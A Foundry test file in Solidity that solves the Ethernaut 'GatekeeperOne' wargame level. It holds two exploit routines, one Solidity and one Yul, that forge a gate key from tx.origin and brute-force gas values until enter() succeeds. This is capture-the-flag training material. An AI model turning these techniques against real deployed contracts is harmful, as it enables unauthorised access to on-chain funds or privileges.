// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {IGatekeeperOne} from "ethernaut/13GateKeeperOne.sol";
import {BaseTest} from "./BaseTest.t.sol";

contract GateKeeperOneTest is BaseTest {
    // IGatekeeperOne public gateKeeperOneInstance = new IGatekeeperOne();
    IGatekeeperOne public gateKeeperOneInstance = IGatekeeperOne(0x12c9E1F057f426e7aA441717119dFAFa696D8d9A);

    function setUp() public override {
        super.setUp();
    }

    function exploitSol() internal override {
        bytes8 _gateKey = bytes8(uint64(uint16((uint160(tx.origin))) ^ 1 << 33));
        for (uint256 index = 29709; true; index++) {
            try gateKeeperOneInstance.enter{gas: index}(_gateKey) {
                break;
            } catch {
                continue;
            }
        }
    }

    function testExploitSol() public override {
        exploitSol();
        assertEq(gateKeeperOneInstance.entrant(), tx.origin);
    }

    function exploitYul() internal override {
        assembly {
            for { let i := 29709 } true { i := add(i, 1) } {
                mstore(0, 0x3370204e)
                let _gateKey := shl(192, xor(and(0xffff, origin()), shl(33, 1)))
                mstore(32, _gateKey)
                let success := call(gas(), sload(gateKeeperOneInstance.slot), 0, 28, 64, 0, 1)
                switch success
                case 1 { break }
                default { }
            }
        }
    }

    function testExploitYul() public override {
        exploitYul();
        assertEq(gateKeeperOneInstance.entrant(), tx.origin);
    }

}
